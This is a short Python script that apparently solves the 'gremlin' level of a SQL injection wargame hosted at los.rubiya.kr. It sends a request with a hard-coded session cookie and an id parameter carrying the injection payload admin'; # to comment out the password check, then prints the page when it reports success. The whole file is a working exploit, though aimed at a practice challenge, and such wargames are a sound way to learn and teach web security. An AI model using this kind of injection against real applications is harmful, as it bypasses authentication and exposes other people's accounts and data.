import requests
headers= {'Cookie':'PHPSESSID=ilbihpsvjpl9h779141vl0ve8f'}
url = "https://los.rubiya.kr/chall/gremlin_280c5552de8b681110e9287421b834fd.php?id=admin%27;%20%23"
r = requests.get(url, headers=headers).text
if "<h2>GREMLIN Clear!</h2>" in r:
    print(r)